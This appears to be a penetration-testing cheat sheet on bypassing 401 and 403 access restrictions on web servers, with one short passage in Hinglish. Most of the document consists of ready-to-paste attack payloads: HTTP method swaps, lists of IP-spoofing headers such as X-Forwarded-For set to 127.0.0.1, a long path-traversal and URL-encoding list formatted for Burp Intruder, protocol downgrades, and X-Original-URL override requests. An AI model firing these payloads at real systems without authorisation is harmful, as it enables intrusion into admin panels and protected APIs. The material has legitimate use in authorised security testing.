# Common methods of bypass 401&403 status codes

## 1. HTTP Methods/Verbs fuzzing.

One of the best known is HTTP Methods/Verbs fuzzing. If you send a request with GET method and response is 401 and 403 you may want to send it again using a different method like POST, PUT , PATCH and see what happens.

Request:

```
GET /admin HTTP/1.1
Host: example.com
...
```

Response:

```
HTTP/1.1 403 Forbidden
Server: Apache/2.4.41
Content-Length: 9
Connection: close

Access Denied
```

You can simply change method to POST

Request:

```
POST /admin HTTP/1.1
Host: example.com
...
```

Response:

```
HTTP/1.1 200 OK
Server: Apache/2.4.41
Content-Length: 564
Connection: close

<!DOCTYPE html>
<html>
<head>
    <title>Admin dashboard</title>
...
```

Other HTTP methods to check:

- GET
- HEAD
- POST
- PUT
- DELETE
- CONNECT
- OPTIONS
- TRACE
- PATCH
- FOO # non existant method also might work

## User-Agent fuzzing

Next to HTTP Methods/Verbs fuzzing another useful method could be User-Agent fuzzing. Sometimes developers want to serve different content depending on what kind of browser/OS you use to access the web app. In case of misconfiguration you might be able to get access to the resource only by modifying User Agent.

```
Mozilla/5.0 (X11; Linux i686; U;rv: 1.7.13) Gecko/20070322
  Kazehakase/0.4.4.1

Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131
  Netscape6/6.01

Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.8.0.2) Gecko/20060309
  SeaMonkey/1.0

Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko/20050405
  Epiphany/1.6.1 (Ubuntu) (Ubuntu package 1.0.2)

Mozilla/5.0 (X11; U; Linux i686; en-US; Nautilus/1.0Final)
  Gecko/20020408

Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801
```

See more in the module below\...

## 2. HTTP Headers fuzzing

HTTP Headers fuzzing is another popular method, this technique involves sending a request to the target server with a modified HTTP header. X-Forwarded-For, Referer and Authorization headers are the most popular one to be modified. X-Forwarded-For can be fuzzed to bypass security controls that rely on IP address filtering. By changing the IP address in this header, an attacker can attempt to bypass any security controls that are based on IP address filtering. Example payloads:

Headers:

- Base-Url: 127.0.0.1
- Client-IP: 127.0.0.1
- Http-Url: 127.0.0.1
- Proxy-Host: 127.0.0.1
- Proxy-Url: 127.0.0.1
- Real-Ip: 127.0.0.1
- Redirect: 127.0.0.1
- Referer: 127.0.0.1
- Referrer: 127.0.0.1
- Refferer: 127.0.0.1
- Request-Uri: 127.0.0.1
- Uri: 127.0.0.1
- Url: 127.0.0.1
- X-Client-IP: 127.0.0.1
- X-Custom-IP-Authorization: 127.0.0.1
- X-Forward-For: 127.0.0.1
- X-Forwarded-By: 127.0.0.1
- X-Forwarded-For-Original: 127.0.0.1
- X-Forwarded-For: 127.0.0.1
- X-Forwarded-Host: 127.0.0.1
- X-Forwarded-Port: 443
- X-Forwarded-Port: 4443
- X-Forwarded-Port: 80
- X-Forwarded-Port: 8080
- X-Forwarded-Port: 8443
- X-Forwarded-Scheme: http
- X-Forwarded-Scheme: https
- X-Forwarded-Server: 127.0.0.1
- X-Forwarded: 127.0.0.1
- X-Forwarder-For: 127.0.0.1
- X-Host: 127.0.0.1
- X-Http-Destinationurl: 127.0.0.1
- X-Http-Host-Override: 127.0.0.1
- X-Original-Remote-Addr: 127.0.0.1
- X-Original-Url: 127.0.0.1
- X-Originating-IP: 127.0.0.1
- X-Proxy-Url: 127.0.0.1
- X-Real-Ip: 127.0.0.1
- X-Remote-Addr: 127.0.0.1
- X-Remote-IP: 127.0.0.1
- X-Rewrite-Url: 127.0.0.1
- X-True-IP: 127.0.0.1

- Burp Suite ke Intruder → Payloads mein paste karne ke liye, har header ko alag payload banana hoga. Neeche wali list mein har line ek separate payload hai.

```
Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Port: 4443
X-Forwarded-Port: 80
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-True-IP: 127.0.0.1
```


- 10.0.0.0
- 10.0.0.1
- 127.0.0.1
- 127.0.0.1:443
- 127.0.0.1:80
- localhost
- 172.16.0.0

See more in the module below\...

## Path Fuzzing and creative string literals.

This is another useful method, you can try to bypass 401 or 403 status code by adding symbols to find alternative paths. example.com/admin gives you 403? Try adding `/%2e/` or `/%252e/` to the path: `example.com/%252e/admin` and check results. You can also try other creative literals.

## Burp Suite Intruder format

```
#
#?
%09
%09%3b
%09..
%09;
%20
23
%23%3f
%%252f%252f
%252f/
%2e%2e
%2e%2e/
%2f
%2f%20%23
%2f%23
%2f%2f
%2f%3b%2f
%2f%3b%2f%2f
%2f%3f
%2f%3f/
2f/
%2f;?
%2f?;
%3b
%3b%09
%%3b%2f%2e%2e
%3b%2f%2e%2e%2f%2e%2e%2f%2f
%3b%2f%2e.
%3b%2f..
%3b/%2e%2e/..%2f%2f
%3b/%2e.
%3b/%2f%2f../
%3b/..
%3b//%2f../
%3f%23
%3f%3f
%3f.php
..%00/
..%00/;
..%00;/
..%09
..%0d/
..%0d/;
..%0d; /
..%5c/
..%ff/
..%ff/;
..%ff;/
../
..;%00/
.;%0d/
..;%ff/
..;\;
..\
..\;
.html
.json
/
/#
/%20
/%20#
/%20%23
/8/23
/%252e%252e%252f/
/%252e%252e%253b/
/%252e%252f/
/%252e%253b/
/%252e/
/%252f
/%2e%2e
/%2e%2e%2f/
/%2e%2e3b/
/%2e%2e/
/%2e%2f/
/%2e3b/
/%2e%3b//
/%2e/
/%2e//
/%2f
/%3b/
/..
/..%2f
/..%2f..%2f
/..%2F..%2F..%2f
/../
/../../
/../../../
/../../..//
/../..//
/../..//../
/../../
/.././../
/.././../
/..//
/..//../
/..//../../
/..//../
/../i/
/..//../
/..
%2f
/..;%2f..;%2f
/..;%2f..;%2f..;%2f
/..il
/../../
/../../
/..il/
/..; //../
/..//../
..i/il
/../i/..;/
1./
1./1
/.;/
1.;//
//
//..
//../../
//..i
//./
//.;/
///..
///../
///..//
///..i
///..;/
///..; //
//:/
lil
/://
/;?
1;x
/;x/
/?
/?;
/x/../
/x/..//
/x/../;/
/x/../
/x/..;//
/x/../i/
/x//../
/x//../
/x/;/../
/x/;/../
;
;%09
;%09..
;%09..;
;%09;
;%2F..
;%2f%2e%2e
;%2f%2e%2e%2f%2e%2e%2f%2f
;%2f%2f/../
;%2f..
;%2f..%2f%2e%2e%2f%2f
;%2f..%2F..%2f%2f
;%2F..%2f/
;%2F..%2f/..%2f
;%2f..%2f/../
;%2f../%2f..%2f
;%2f../%2f../
;%2f..//..%2f
;%2f..//../
;%2f..///
;%2f..///;
;%2f..//;/
;%2f..//;/;
;%2f../;//
;%2f../;/;/
;%2f../;/;/;
;%2f..; ///
;%2f..; //;/
;%2f..;/;//
;%2f/%2f../
;%2f//..%2f
;%2f//../
;%2f//..;/
;%2f/;/../
;%2f/;/..;/
;%2f; //../
;%2f; /;/..;/
;/%2e%2e
;/%2e%2e%2f%2f
;/%2e%2e%2f/
;/%2e%2e/
;/%2e.
;/%2f%2f../
;/%2f/..%2f
;/%2f/../
;/.%2e
;/.%2e/%2e%2e/%2f
;/..
;/..%2f
;/..%2f%2f../
;/..%2F..%2f
;/..%2f/
;/..%2f//
;/../
;/../%2f/
;/../../
;/../..//
;/.././../
;/.././../
;/..//
;/..//%2e%2e/
;/..//%2f
;/..//../
;/..///
;/../;/
/..//../
;/..;
;/.;.
; //%2f../
; //..
; //../../
;///..
; ///../
; ///..//
; ?
;X
;x/
;x;
?
? #
?.php
?;
??
///
///%2f/
/%2f/
//%2f
%%2f/%2f
%2f%2f%2f
%%2f//
 
```


See more in the module below\...

💡 Why this works?

The `/%2e/` or `/%252e/` sequence represents the URL-encoded version of the `.` character, which is used to represent the current directory in file paths. By using this sequence in the URL path, the server may interpret the request as accessing a different path than the one intended, potentially bypassing access controls that are based on the original path.

## Downgrade the protocol version.

HTTP/2 won’t let you in? Try 1.1. You can also try all other techniques along with downgrading the protocol, one useful one might be to downgrade to 1.0 and remove the Host header at all - it can cause unexpected behaviour of the server. This technique was described in detail in this research article.

- 0.9
- 1.0
- 1.1
- 2

- ## 3. URL Override Headers (Change the Route Internally)

Some proxies support headers that rewrite the URL internally.

If direct access returns 403:

Request:

```
GET /api/getUser HTTP/1.1
Host: target.com
```

Try:

```
GET / HTTP/1.1
Host: target.com
X-Original-URL: /api/getUser
```

Or:

```
X-Rewrite-URL: /api/getUser
X-Override-URL: /api/getUser
```

Possible result:

- WAF checks `/` (looks harmless) and lets it through.
- Proxy rewrites to `/api/getUser` internally, where your request is now processed without the original rule hitting.
